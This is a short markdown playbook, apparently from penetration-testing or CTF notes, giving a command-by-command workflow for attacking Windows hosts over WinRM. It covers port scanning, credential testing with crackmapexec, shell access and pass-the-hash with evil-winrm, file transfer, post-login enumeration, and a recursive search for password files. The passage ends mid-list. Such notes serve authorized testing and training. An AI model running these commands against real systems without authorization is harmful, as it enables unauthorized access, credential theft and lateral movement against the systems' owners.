# WinRM Enumeration & Exploitation

## Purpose

This file provides a structured workflow for leveraging WinRM to gain shell access on Windows systems.

Core rules:

* WinRM = direct shell access
* Credentials are required
* Always test creds immediately
* Use WinRM for stable access and lateral movement

---

## 0. Identify WinRM

Common ports:

* 5985 (HTTP)
* 5986 (HTTPS)

Confirm:

```bash id="4hxq61"
nmap -p 5985,5986 -sV <IP>
```

---

## 1. Credential Validation (FAST)

```bash id="sl1m33"
crackmapexec winrm <IP> -u user -p pass
```

If success:
→ proceed immediately to shell

---

## 2. Evil-WinRM (PRIMARY TOOL)

```bash id="7s9q3k"
evil-winrm -i <IP> -u user -p pass
```

---

## 3. Pass-the-Hash

```bash id="0c3hr2"
evil-winrm -i <IP> -u user -H <NTLM_HASH>
```

---

## 4. File Upload / Download

Upload:

```bash id="xq2q7u"
upload file
```

Download:

```bash id="q8e1ac"
download file
```

---

## 5. Post-Login Enumeration

Immediately run:

```powershell id="tn1q6z"
whoami
whoami /priv
hostname
```

---

## 6. Privilege Check

```powershell id="j7n0kk"
whoami /groups
```

Check for:

* admin groups
* special privileges

---

## 7. Local Enumeration

```powershell id="f4mj9x"
systeminfo
```

```powershell id="k0c7ow"
ipconfig
```

---

## 8. Credential Discovery

Search:

```powershell id="0hfrz3"
dir C:\ -Recurse -ErrorAction SilentlyContinue | findstr /i pass
```

Look for:

* config files
